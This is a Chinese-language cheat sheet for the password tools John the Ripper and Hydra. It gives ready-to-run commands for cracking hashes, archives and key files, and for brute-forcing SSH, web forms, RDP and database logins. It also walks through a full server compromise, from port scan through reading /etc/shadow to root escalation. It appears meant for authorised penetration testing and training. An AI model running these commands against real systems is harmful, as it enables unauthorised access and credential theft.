
---

# John & Hydra 速查卡（完整版）

> **用途**：密码破解与爆破
> **场景**：John 破解哈希（离线），Hydra 爆破登录口（在线）

---

## 目录

- [一、John the Ripper](#一john-the-ripper)
  - [1.1 基础用法](#11-基础用法)
  - [1.2 常见哈希格式](#12-常见哈希格式)
  - [1.3 实战：破解 Linux 密码](#13-实战破解-linux-密码)
  - [1.4 实战：破解 Windows NTLM](#14-实战破解-windows-ntlm)
  - [1.5 高级用法](#15-高级用法)
  - [1.6 John 常用字典路径](#16-john-常用字典路径)
  - [1.7 更多 John 技巧](#17-更多-john-技巧)
- [二、Hydra](#二hydra)
  - [2.1 基础语法](#21-基础语法)
  - [2.2 常用协议](#22-常用协议)
  - [2.3 实战：SSH 爆破](#23-实战ssh-爆破)
  - [2.4 实战：FTP 爆破](#24-实战ftp-爆破)
  - [2.5 实战：Web 表单爆破（重点）](#25-实战web-表单爆破重点)
  - [2.6 实战：HTTP Basic 认证](#26-实战http-basic-认证)
  - [2.7 高级用法](#27-高级用法)
  - [2.8 常用参数速查](#28-常用参数速查)
  - [2.9 更多 Hydra 技巧](#29-更多-hydra-技巧)
- [三、实战套路（一条龙）](#三实战套路一条龙)
- [四、速记口诀](#四速记口诀)
- [五、附录：字典与工具](#五附录字典与工具)

---

## 一、John the Ripper

John the Ripper 是一款强大的离线密码破解工具，支持多种哈希格式。

### 1.1 基础用法

```bash
# 基础破解（自动检测格式）
john hash.txt

# 指定哈希格式
john --format=raw-md5 hash.txt           # 破解 MD5 哈希
john --format=raw-sha1 hash.txt          # 破解 SHA1 哈希
john --format=raw-sha256 hash.txt        # 破解 SHA256 哈希
john --format=raw-sha512 hash.txt        # 破解 SHA512 哈希

# 指定字典破解
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john -w=字典.txt hash.txt                # 简写

# 显示已破解的密码
john --show hash.txt                     # 显示所有已破解结果
john --show --format=raw-md5 hash.txt    # 指定格式显示

# 查看破解状态
john --status hash.txt                   # 查看当前进度

# 测试哈希类型（自动检测）
john --test                              # 测试性能
```

### 1.2 常见哈希格式

| 格式参数 | 说明 |
|---------|------|
| `--format=nt` | Windows NTLM 哈希 |
| `--format=raw-md5` | 普通 MD5（32位） |
| `--format=raw-sha1` | 普通 SHA1（40位） |
| `--format=raw-sha256` | SHA256 |
| `--format=raw-sha512` | SHA512 |
| `--format=bcrypt` | bcrypt（慢，但常见） |
| `--format=sha512crypt` | Linux /etc/shadow 格式 |
| `--format=md5crypt` | Linux MD5 加密 |
| `--format=descrypt` | DES 加密（旧版 Unix） |
| `--format=mysql` | MySQL 4.1+ 密码哈希 |
| `--format=postgres` | PostgreSQL 密码哈希 |
| `--format=mssql` | MSSQL 密码哈希 |
| `--format=md5($pass.$salt)` | 带盐 MD5 |
| `--format=zip` | ZIP 压缩包密码 |
| `--format=rar` | RAR 压缩包密码 |
| `--format=pdf` | PDF 文件密码 |
| `--format=keystore` | Java KeyStore |

### 1.3 实战：破解 Linux 密码

```bash
# Step 1: 合并 passwd 和 shadow
unshadow /etc/passwd /etc/shadow > hashes.txt

# Step 2: 用默认字典破解
john hashes.txt

# Step 3: 指定字典破解
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Step 4: 显示结果
john --show hashes.txt

# 结果示例：root:password123:0:0:root:/root:/bin/bash
```

### 1.4 实战：破解 Windows NTLM

```bash
# 从 Windows 抓到的哈希（如 hashdump 输出）
# 格式：用户名:RID:LM哈希:NTLM哈希:::
# 例如：Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# 保存为 hash.txt，然后破解
john --format=nt hash.txt
john --format=nt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# 显示结果
john --show --format=nt hash.txt
```

### 1.5 高级用法

```bash
# 暴力枚举（极慢，不推荐）
john --incremental hash.txt
john --incremental=digits hash.txt      # 仅数字
john --incremental=alpha hash.txt       # 仅字母

# 应用变形规则（如 password → Password123）
john --rules --wordlist=字典.txt hash.txt
john --rules=best64 --wordlist=rockyou.txt hash.txt  # 使用特定规则集

# 外部模式（自定义生成规则）
john --external=MyGenerator hash.txt

# 使用 Salt
john --format=md5crypt --wordlist=dict.txt hash.txt

# 输出到 hydra（生成字典）
john --stdout --wordlist=rockyou.txt > /tmp/generated.txt

# 恢复中断的破解
john --restore hash.txt

# 显示破解时间
john --show=pot hash.txt                 # 显示密码破解时间

# 使用多个字典
john --wordlist=dict1.txt --wordlist=dict2.txt hash.txt

# 使用规则集文件
john --rules=myrules.conf --wordlist=dict.txt hash.txt
```

### 1.6 John 常用字典路径

```bash
# Kali 自带字典
/usr/share/wordlists/rockyou.txt.gz      # 经典密码字典（需解压）
/usr/share/wordlists/rockyou.txt         # 解压后
/usr/share/wordlists/fasttrack.txt       # 常用弱密码（约 200 条）
/usr/share/wordlists/metasploit/         # MSF 专用字典

# John 自带字典
/usr/share/john/password.lst             # John 自带示例字典

# 解压 rockyou
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# 查看字典行数
wc -l /usr/share/wordlists/rockyou.txt
```

### 1.7 更多 John 技巧

```bash
# 破解 ZIP 压缩包密码
zip2john archive.zip > zip.hash
john --wordlist=rockyou.txt zip.hash

# 破解 RAR 压缩包密码
rar2john archive.rar > rar.hash
john --wordlist=rockyou.txt rar.hash

# 破解 PDF 密码
pdf2john document.pdf > pdf.hash
john --wordlist=rockyou.txt pdf.hash

# 破解 SSH 私钥密码（需要 ssh2john）
ssh2john id_rsa > ssh.hash
john --wordlist=rockyou.txt ssh.hash

# 破解 KeePass 密码（需要 keepass2john）
keepass2john database.kdbx > keepass.hash
john --wordlist=rockyou.txt keepass.hash

# 自定义输出格式
john --format=raw-md5 hash.txt --show=plaintext   # 仅显示明文

# 使用 GPU 加速（需要 OpenCL 支持）
john --format=bcrypt --devices=0 hash.txt

# 使用多种格式
john --format=raw-md5,raw-sha1 hash.txt
```

---

## 二、Hydra

Hydra 是一款强大的在线密码爆破工具，支持多种网络协议。

### 2.1 基础语法

```bash
hydra -l 用户名 -P 密码字典 目标协议://目标IP
```

### 2.2 常用协议

| 协议 | 说明 |
|------|------|
| `ssh` | SSH 爆破 |
| `ftp` | FTP 爆破 |
| `http-post-form` | Web 表单爆破（POST） |
| `http-get-form` | Web 表单爆破（GET） |
| `http-get` | HTTP Basic 认证 |
| `smb` | Windows 共享爆破 |
| `mysql` | MySQL 数据库爆破 |
| `mssql` | MSSQL 数据库爆破 |
| `postgres` | PostgreSQL 爆破 |
| `rdp` | Windows 远程桌面 |
| `telnet` | Telnet 爆破 |
| `vnc` | VNC 爆破 |
| `pop3` / `imap` | 邮件协议爆破 |
| `smtp` | SMTP 爆破 |
| `redis` | Redis 爆破 |
| `mongodb` | MongoDB 爆破 |

### 2.3 实战：SSH 爆破

```bash
# 单用户 + 单密码字典
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# 多用户 + 单密码
hydra -L users.txt -p password ssh://192.168.1.100

# 多用户 + 多密码字典
hydra -L users.txt -P pass.txt ssh://192.168.1.100

# 指定端口（非默认 22）
hydra -l root -P pass.txt -s 2222 ssh://192.168.1.100

# 限制线程数
hydra -l root -P pass.txt -t 4 ssh://192.168.1.100

# 找到第一个密码后停止
hydra -l root -P pass.txt -f ssh://192.168.1.100

# 显示详细尝试过程
hydra -l root -P pass.txt -V ssh://192.168.1.100
```

### 2.4 实战：FTP 爆破

```bash
# 基础爆破
hydra -l admin -P /usr/share/wordlists/fasttrack.txt ftp://192.168.1.100

# 多用户爆破
hydra -L users.txt -P pass.txt ftp://192.168.1.100

# 指定端口
hydra -l admin -P pass.txt -s 2121 ftp://192.168.1.100
```

### 2.5 实战：Web 表单爆破（重点）

```bash
# 步骤1：抓包分析
# 使用 Burp Suite 或浏览器开发者工具抓取登录请求
# 示例 POST 请求：
# POST /login.php HTTP/1.1
# Host: 192.168.1.100
# username=admin&password=123&submit=Login

# 步骤2：构建 Hydra 命令
# 语法：hydra -l 用户 -P 密码 目标IP http-post-form "/路径:参数:失败标志"
# 失败标志：页面中出现的关键词（如 "incorrect"、"错误"）
# 成功标志：通常是没有出现失败关键词

# 基础示例
hydra -l admin -P pass.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^&submit=Login:F=incorrect"

# 参数说明：
# ^USER^ 和 ^PASS^ 是占位符，hydra 会用字典里的用户名/密码替换
# F=incorrect 表示页面出现 "incorrect" 字样时登录失败
# 登录成功的标志通常是不出现错误信息（S=success）

# 更复杂的例子（带 Cookie）
hydra -l admin -P pass.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^&csrf_token=abc123:F=错误"

# 使用 HTTPS
hydra -l admin -P pass.txt 192.168.1.100 https-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# 多用户 + 多密码
hydra -L users.txt -P pass.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# GET 表单（http-get-form）
hydra -l admin -P pass.txt 192.168.1.100 http-get-form "/search.php:q=^USER^:F=Not found"
```

**实战技巧**：
```bash
# 1. 如果登录失败返回 HTTP 302 重定向，用 H= 检测
hydra -l admin -P pass.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:H=Location: /dashboard"

# 2. 同时检查多个失败标志
hydra -l admin -P pass.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect|F=error|F=Invalid"

# 3. 自定义 Header
hydra -l admin -P pass.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:H=User-Agent: Mozilla/5.0:F=incorrect"
```

### 2.6 实战：HTTP Basic 认证

```bash
# HTTP Basic 认证（浏览器弹出登录框那种）
hydra -L users.txt -P pass.txt 192.168.1.100 http-get /admin/

# 指定目录
hydra -L users.txt -P pass.txt 192.168.1.100 http-get /protected/
```

### 2.7 高级用法

```bash
# 多目标爆破
hydra -l root -P pass.txt -M targets.txt ssh

# 从输出文件读取目标
hydra -l admin -P pass.txt -M hosts.txt ftp

# 恢复中断的爆破
hydra -R                           # 从 hydra.restore 恢复

# 使用代理
hydra -l admin -P pass.txt -x 4:8:A ssh://192.168.1.100  # 生成密码

# 组合攻击（用户名和密码使用同一个字典）
hydra -L users.txt -P users.txt ssh://192.168.1.100

# 只显示成功的尝试
hydra -l admin -P pass.txt -o results.txt ssh://192.168.1.100

# JSON 格式输出
hydra -l admin -P pass.txt -o results.json -j ssh://192.168.1.100

# 指定协议超时
hydra -l admin -P pass.txt -t 1 -w 5 ssh://192.168.1.100  # -w 5 秒超时
```

### 2.8 常用参数速查

| 参数 | 说明 |
|------|------|
| `-l` | 单个用户名 |
| `-L` | 用户名字典文件 |
| `-p` | 单个密码 |
| `-P` | 密码字典文件 |
| `-t` | 线程数（默认 16） |
| `-T` | 总线程数（多目标时） |
| `-V` | 显示每次尝试详情 |
| `-v` / `-vV` | 更详细输出 |
| `-f` | 找到第一个密码后停止 |
| `-s` | 指定端口（非默认端口） |
| `-w` | 超时时间（秒） |
| `-W` | 响应等待时间（毫秒） |
| `-o` | 输出结果到文件 |
| `-M` | 目标列表文件（每行一个 IP） |
| `-R` | 恢复中断的爆破 |
| `-x` | 生成密码（如 `-x 4:8:A` 生成 4-8 位字母） |
| `-e` | 额外检测（如 `-e nsr` 检查空密码、用户名、反向用户名） |
| `-u` | 每个用户名尝试所有密码（默认是每个密码尝试所有用户名） |

### 2.9 更多 Hydra 技巧

```bash
# 爆破 MySQL
hydra -L users.txt -P pass.txt mysql://192.168.1.100

# 爆破 SMB（Windows 共享）
hydra -l administrator -P pass.txt smb://192.168.1.100

# 爆破 RDP（Windows 远程桌面）
hydra -l administrator -P pass.txt rdp://192.168.1.100

# 爆破 Redis
hydra -P pass.txt redis://192.168.1.100

# 爆破 PostgreSQL
hydra -L users.txt -P pass.txt postgres://192.168.1.100

# 爆破 MongoDB
hydra -L users.txt -P pass.txt mongodb://192.168.1.100

# 爆破 VNC
hydra -P pass.txt vnc://192.168.1.100

# 爆破 Telnet
hydra -l root -P pass.txt telnet://192.168.1.100

# 爆破 SMTP
hydra -l user -P pass.txt smtp://192.168.1.100

# 爆破 IMAP/POP3
hydra -l user -P pass.txt imap://192.168.1.100
hydra -l user -P pass.txt pop3://192.168.1.100

# 爆破 Cisco 设备
hydra -l admin -P pass.txt cisco://192.168.1.100
```

---

## 三、实战套路（一条龙）

### 场景1：拿到哈希，破解明文密码

```bash
# 1. 从网站数据库导出用户表，得到 admin 的 MD5 密码
# 2. 用 John 破解
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show hash.txt
```

### 场景2：爆破 SSH 弱密码

```bash
# 基础爆破
hydra -l root -P /usr/share/wordlists/fasttrack.txt ssh://192.168.1.100

# 发现密码后登录
ssh root@192.168.1.100
```

### 场景3：爆破 Web 后台登录

```bash
# 1. 在 Burp Suite 里抓登录请求，复制整个 POST 行
# 2. 根据错误页面的提示（如 "用户名或密码错误"）设置 F=
hydra -l admin -P pass.txt 192.168.1.100 http-post-form "/admin/login.php:user=^USER^&pass=^PASS^:F=error"
```

### 场景4：John + Hydra 联合作战

```bash
# 1. John 破解数据库里的哈希，得到明文密码
john --format=raw-md5 hash.txt --wordlist=rockyou.txt
john --show hash.txt

# 2. Hydra 用这个密码去爆破其他服务（如 SSH、FTP）
hydra -l root -p 找到的密码 ssh://192.168.1.100
```

### 场景5：从零开始攻破一台服务器

```bash
# Step 1: 扫描端口
nmap -sV 192.168.1.100

# Step 2: 发现 SSH 开放（端口 22）
# Step 3: 爆破 SSH
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Step 4: 获取密码后登录
ssh user@192.168.1.100

# Step 5: 查看 /etc/shadow（需要 root）
sudo cat /etc/shadow

# Step 6: 导出哈希，用 John 破解（提权准备）
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=rockyou.txt hashes.txt

# Step 7: 如果破解成功，获得 root 密码，提权
su root
```

### 场景6：爆破 WordPress 后台

```bash
# WordPress 后台登录 URL：/wp-admin/
# POST 格式：log=admin&pwd=123&wp-submit=Log+In&redirect_to=/wp-admin/&testcookie=1

hydra -L users.txt -P pass.txt 192.168.1.100 http-post-form "/wp-admin/:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect"
```

### 场景7：爆破 Joomla 后台

```bash
# Joomla 后台：/administrator/
# POST 格式：username=admin&passwd=123&option=com_login&task=login

hydra -l admin -P pass.txt 192.168.1.100 http-post-form "/administrator/:username=^USER^&passwd=^PASS^&option=com_login&task=login:F=Invalid"
```

### 场景8：破解数据库备份文件

```bash
# 破解 ZIP 压缩包（包含数据库备份）
zip2john backup.zip > zip.hash
john --wordlist=rockyou.txt zip.hash

# 破解成功后解压
unzip -P 找到的密码 backup.zip
```

---

## 四、速记口诀

```
John 破哈希，离线把密还
Hydra 在线爆，表单 SSH 跑
字典用 rockyou，弱密跑不掉

zip2john 拆压缩，rar2john 解密码
pdf2john 破文档，ssh2john 救私钥

john --wordlist 指定字典
john --show 查看结果
john --incremental 暴力跑
john --restore 接着干

hydra -l 单用户，-L 读字典
-P 密码表，-t 线程数
-f 找到停，-V 看过程
```

---

## 五、附录：字典与工具

### 常用字典

```bash
# Kali 自带字典位置
/usr/share/wordlists/
├── rockyou.txt              # 经典密码字典（1434 万条）
├── rockyou.txt.gz           # 压缩版
├── fasttrack.txt            # 常用弱密码（约 200 条）
├── dirb/                    # 目录扫描
│   ├── common.txt
│   └── big.txt
├── metasploit/              # MSF 专用
└── wfuzz/                   # Web 模糊测试

# 安装 Seclists（更全面的字典）
sudo apt install seclists
/usr/share/seclists/
├── Passwords/               # 密码字典
├── Usernames/               # 用户名字典
├── Discovery/               # 发现类字典
└── Fuzzing/                 # 模糊测试

# 生成自定义字典
crunch 4 8 0123456789 -o numbers.txt   # 生成 4-8 位数字字典
crunch 6 6 abcdefghijklmnopqrstuvwxyz -o 6letter.txt
```

### 常用工具补充

```bash
# CeWL - 从网站爬取自定义字典
cewl http://example.com -w custom.txt
cewl -d 3 -m 5 -w words.txt http://example.com

# Hashcat - GPU 加速密码破解
hashcat -m 0 -a 0 hash.txt rockyou.txt
# -m 0: MD5, -m 1000: NTLM, -m 3200: bcrypt

# Medusa - Hydra 替代品
medusa -h 192.168.1.100 -u root -P pass.txt -M ssh

# Ncrack - 另一个爆破工具
ncrack -U users.txt -P pass.txt ssh://192.168.1.100

# Crowbar - 支持更多协议
crowbar -b ssh -s 192.168.1.100/32 -u root -C pass.txt
```

### 字典生成技巧

```bash
# 基于域名生成密码
cewl example.com -w passwords.txt

# 生成常见密码变体
# password → Password, password123, Password123, p@ssword
john --rules --stdout --wordlist=base.txt > expanded.txt

# 合并字典
cat dict1.txt dict2.txt > combined.txt

# 去重
sort combined.txt | uniq > unique.txt

# 提取特定长度密码
awk 'length($0) >= 8 && length($0) <= 12' passwords.txt > filtered.txt
```

---

> **⚠️ 免责声明**：本文档仅用于授权渗透测试和安全学习。未经授权对他人系统进行密码破解或爆破属于违法行为。请在合法的靶场环境（如 HackTheBox、VulnHub、DVWA）中练习。

---
